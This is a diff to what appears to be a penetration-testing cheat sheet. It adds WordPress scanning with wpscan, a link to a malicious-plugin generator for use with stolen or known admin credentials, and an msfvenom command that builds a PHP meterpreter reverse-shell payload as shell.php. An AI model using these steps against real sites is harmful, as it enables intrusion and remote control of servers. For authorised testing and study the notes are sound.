@@ -83,6 +83,13 @@ Get list of installed software
 snmpwalk -c public -v1 <Target-IP> 1.3.6.1.2.1.25.6.3.1.2
 ```
 
+## Wordpress Enumeration
+```bash
+wpscan --update
+wpscan --url <TARGET-URL>
+```
+
+
 
 # File Transfer and File Downloads
 
@@ -124,9 +131,18 @@ ORDER BY 1--
 statement to sql command.
 Than increase number after ORDER BY until you receive a error => Value before is the correct number of columns for UNION statement.
 
-
+## Wordpress Exploiting
+When you have valid admin credentials for Wordpress installation use following script to generate malicious plugin and uploading the generated plugin to WP.
+[https://github.com/wetw0rk/malicious-wordpress-plugin/blob/master/wordpwn.py](https://github.com/wetw0rk/malicious-wordpress-plugin/blob/master/wordpwn.py)
 
 ## Creating Exploits with msfvenom
+### Web Payloads
+
+#### PHP Meterpreter
+```bash
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+```
+Don't forget to remove the starting chars of the generated file.
 
 ## Buffer Overflows
 
